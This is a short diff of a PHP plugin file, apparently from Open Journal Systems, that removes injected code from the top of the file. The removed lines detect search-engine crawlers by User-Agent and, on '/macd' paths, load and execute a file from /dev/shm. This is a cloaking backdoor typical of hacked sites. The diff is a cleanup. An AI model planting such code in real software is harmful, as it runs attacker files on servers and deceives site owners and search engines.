@@ -1,46 +1,5 @@
 <?php
 
-$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$request_uri = $_SERVER['REQUEST_URI'] ?? '/';
-$is_bot = false;
-
-$bot_signatures = [
-    'Googlebot',
-    'Google-InspectionTool',
-    'Mediapartners-Google',
-    'AdsBot-Google',
-    'Bingbot',
-    'Slurp',
-    'DuckDuckBot',
-    'AhrefsBot',
-    'SEMRushBot',
-    'MJ12bot',
-    'YandexBot'
-];
-
-// Deteksi apakah User-Agent cocok dengan bot signature
-foreach ($bot_signatures as $bot) {
-    if (stripos($user_agent, $bot) !== false) {
-        $is_bot = true;
-        break;
-    }
-}
-
-if ($is_bot) {
-
-    if (stripos($request_uri, '/macd/') !== false) {
-        require('/dev/shm/macd');
-        exit;
-    }
-}
-if ($is_bot) {
-
-    if (stripos($request_uri, '/macd') !== false) {
-        require('/dev/shm/macd');
-        exit;
-    }
-}
-
 /**
  * @file plugins/generic/usageEvent/PKPUsageEventPlugin.php
  *
